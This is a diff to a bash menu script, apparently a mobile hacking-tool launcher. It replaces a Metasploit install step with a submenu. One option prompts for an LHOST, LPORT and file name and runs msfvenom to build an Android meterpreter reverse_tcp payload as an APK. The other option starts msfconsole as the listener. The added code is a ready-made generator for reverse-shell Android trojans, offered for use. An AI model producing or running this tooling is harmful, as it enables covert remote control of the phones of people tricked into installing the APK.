@@ -70,11 +70,32 @@ fi
 
 if [[ $ch == 5 ]]; then
 
-printf "${red}Installing${null}${yelw} Metasploit Framework ...${null} \n"
-pkg install unstable-repo
-pkg install metasploit
-clear
-figlet -f standard "DONE" | lolcat
+printf "${red}Running${null}${yelw} Metasploit Framework ...${null} \n"
+figlet -f standard "MSF"
+echo
+printf "1). Create Payload.\n" | lolcat --animate
+printf "2). Start  Listener.\n" | lolcat --animate
+echo
+echo
+read op
+if [[ $op == 1 ]]; then
+
+printf "${yelw}Enter your LHOST:>${null}\n"
+read host
+echo
+printf "${yelw}Enter your LPORT:>${null}\n"
+read port
+echo
+printf "${yelw}Enter Payload Name:>${null}\n"
+read name
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o /sdcard/$name.apk
+fi
+
+if [[ $op == 2 ]]; then 
+
+msfconsole
+fi
 
 fi 
 
